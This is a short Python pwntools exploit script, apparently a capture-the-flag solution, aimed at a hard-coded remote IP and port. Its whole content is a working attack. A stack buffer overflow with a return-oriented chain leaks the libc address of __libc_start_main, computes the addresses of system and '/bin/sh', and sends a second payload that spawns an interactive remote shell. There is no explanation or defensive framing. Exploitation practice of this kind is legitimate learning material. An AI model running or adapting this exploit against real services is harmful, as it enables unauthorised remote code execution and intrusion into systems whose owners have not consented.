from pwn import *

system_off = 0x46590
binsh_offset = 0x180543
libc_start_main_offset = 0x21e50
got_libc_start_main = 0x601020
pop_rdi_ret = 0x400623
_print = 0x400450
main = 0x40057d
valid_addr = 0x7fffffffa000


s = remote("103.237.99.35", 25031)

payload = "a"*0x20 + p64(valid_addr) + p64(pop_rdi_ret) + p64(got_libc_start_main) + p64(_print) + p64(main)
s.sendline(payload)
s.recv()

libc_start_main_addr = u64(s.recv() + "\x00\x00")
libc_base = libc_start_main_addr - libc_start_main_offset
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_offset

payload = "a"*0x20 + p64(valid_addr) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
s.sendline(payload)
s.recv()
s.interactive()
s.close()